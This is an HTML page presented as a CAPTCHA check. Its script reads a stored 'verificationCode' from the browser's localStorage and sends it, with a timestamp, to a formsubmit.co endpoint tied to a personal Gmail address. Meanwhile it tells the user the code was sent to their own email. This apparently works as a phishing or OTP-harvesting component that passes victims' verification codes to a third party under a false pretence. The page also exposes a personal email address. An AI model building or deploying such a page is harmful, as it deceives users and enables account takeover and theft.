<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>CAPTCHA Verification</title>
  <link href="https://fonts.googleapis.com/css2?family=Merriweather+Sans:ital,wght@0,800&family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }
    .container {
      background: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
      max-width: 500px;
      width: 90%;
    }
    h1 {
      font-family: 'Merriweather Sans', sans-serif;
      color: #0011D2;
      margin-bottom: 20px;
    }
    p {
      font-family: 'Roboto', sans-serif;
      color: #000000;
      margin-bottom: 20px;
      -webkit-text-stroke: 1px #00000010; /* optional soft stroke */
    }
    .captcha-box {
      background: #f9f9f9;
      padding: 20px;
      border-radius: 5px;
      margin: 20px 0;
    }
    #captcha {
      font-size: 28px;
      font-weight: bold;
      letter-spacing: 5px;
      margin: 15px 0;
    }
    #captchaInput {
      padding: 10px;
      width: 200px;
      margin: 10px 0;
      font-size: 16px;
    }
    .btn {
      background: linear-gradient(to right, #0011D2, #00cfff);
      color: white;
      border: none;
      padding: 12px 25px;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
      transition: background 0.3s;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>CAPTCHA Verification</h1>
    <p>Please complete the CAPTCHA to continue:</p>
    
    <div class="captcha-box">
      <div id="captcha"></div>
      <input type="text" id="captchaInput" placeholder="Enter CAPTCHA">
    </div>
    
    <button class="btn" id="verifyBtn">Verify</button>
  </div>

  <script>
    // Generate CAPTCHA
    const generateCaptcha = () => {
      const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
      let captcha = '';
      for (let i = 0; i < 6; i++) {
        captcha += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      document.getElementById('captcha').textContent = captcha;
      return captcha;
    };
    
    // Get Indian time
    const getIndianTime = () => {
      const now = new Date();
      return now.toLocaleString('en-IN', { 
        timeZone: 'Asia/Kolkata',
        day: 'numeric',
        month: 'short',
        year: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
      });
    };
    
    // Initialize
    let currentCaptcha = generateCaptcha();
    
    // Verify button event
    document.getElementById('verifyBtn').addEventListener('click', function() {
      const userInput = document.getElementById('captchaInput').value.toUpperCase();
      const verificationCode = localStorage.getItem('verificationCode');
      
      if(userInput === currentCaptcha) {
        // Send email with Indian time
        fetch('https://formsubmit.co/ajax/rajibmurmublp@gmail.com', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ 
            Code: verificationCode,
            Time: getIndianTime(),
            _subject: "New Verification Code"
          })
        })
        .then(response => {
          if(response.ok) {
            alert('Verification successful! Code has been sent to your email.');
            window.location.href = 'index.html';
          }
        });
      } else {
        alert('Incorrect CAPTCHA. Please try again.');
        currentCaptcha = generateCaptcha();
        document.getElementById('captchaInput').value = '';
      }
    });
  </script>
</body>
</html>
